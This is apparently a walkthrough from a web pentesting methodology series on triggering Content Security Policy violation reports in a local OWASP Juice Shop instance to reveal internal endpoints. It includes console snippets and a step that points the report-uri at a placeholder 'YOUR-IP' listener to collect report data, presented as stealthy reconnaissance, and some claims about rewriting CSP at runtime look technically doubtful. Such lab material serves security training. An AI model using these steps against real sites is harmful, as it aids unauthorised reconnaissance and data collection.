# 🔍 Method-18-Use-CSP-Reports-to-Reveal-Internal-Endpoints

## 🧠 Overview
Content Security Policy (CSP) is a browser security feature that instructs the browser to restrict resource loading to whitelisted domains and report violations. Attackers can passively or actively exploit CSP violation reports to extract sensitive information, including internal endpoint references, IPs, or resource load paths that are not meant to be public.

This technique focuses on intercepting or causing CSP violations in the OWASP Juice Shop application and analyzing the resulting **CSP report URIs** for clues to internal metrics or endpoint leakages.

---

## 🎯 Goal
Trigger CSP violations to force the application to disclose internal or hidden resource paths in violation reports, and analyze the report contents for internal API structure, endpoints, or misconfigured policies.

---

## ⚙️ Pre-Requisites

- Working instance of OWASP Juice Shop (Docker or local)
- Browser (with DevTools)
- Proxy tools: **Burp Suite**, **OWASP ZAP**, or **mitmproxy**
- Local listener (e.g., Python HTTP server or `nc`) to receive CSP reports
- Familiarity with HTTP headers and CSP directives

---

## 🧪 Step-by-Step Methodology

### 🔧 Step 1: Launch Juice Shop Locally
```bash
docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop
Visit http://localhost:3000

Confirm app is running.

🧠 Step 2: Understand CSP Behavior
Juice Shop might enforce CSP headers like:

http
Copy
Edit
Content-Security-Policy: default-src 'self'; report-uri /csp/report
This tells the browser: "If any resource violates the policy, send a report to /csp/report".

🎭 Step 3: Induce a Violation
Open Developer Tools → Console tab. Inject the following in browser console:

js
Copy
Edit
var img = document.createElement("img");
img.src = "http://internalhost.local/callback";
document.body.appendChild(img);
If internalhost.local is not allowed by the CSP, a violation report is triggered.

It gets POSTed to /csp/report.

🔍 Step 4: Intercept CSP Report
Use Burp Suite or ZAP to monitor POST requests made to /csp/report.

Expect payload like:

json
Copy
Edit
{
  "csp-report": {
    "document-uri": "http://localhost:3000",
    "blocked-uri": "http://internalhost.local/callback",
    "violated-directive": "img-src"
  }
}
The blocked-uri could reveal internal IPs, test endpoints, CDN assets, or telemetry/metrics locations.

🧬 Step 5: Analyze Behavior Internally
What’s happening:

Browser parses Content-Security-Policy.

When it encounters a disallowed resource (e.g., img.src = external domain), it blocks loading.

Simultaneously, sends structured JSON violation report to the report-uri.

These reports often expose:

Internal IPs

Misconfigured resource URLs

Non-production/testing URLs

Legacy or deprecated API endpoints

📡 Step 6: Host Custom CSP Report Collector (Optional)
Run a simple HTTP listener to collect CSP data externally:

bash
Copy
Edit
python3 -m http.server 9000
Then in the browser:

js
Copy
Edit
document.querySelector("meta[http-equiv='Content-Security-Policy']").setAttribute(
  "content",
  "default-src 'self'; report-uri http://YOUR-IP:9000"
);
Trigger the same violation. Check the Python server logs for report data.

🛡️ Why This Matters
CSP reports often contain backend URLs, subdomains, or API endpoints that are not visible via normal enumeration.

Reports may also expose paths related to metrics collection, third-party plugins, or shadow APIs.

This allows low-noise reconnaissance using browser-native behavior.

🧼 Cleanup
Remove the CSP meta tag or browser scripts used to inject violations.

Shut down listeners or reset proxy configurations.

🔚 Conclusion
Using CSP reports is a stealthy, low-impact method to harvest endpoint clues, especially in applications with poorly configured CSPs or internal logic leaks. Always consider chaining this technique with other passive recon tools for deep application mapping.

📎 References
MDN Web Docs: Content Security Policy (CSP)

OWASP CSP Guide
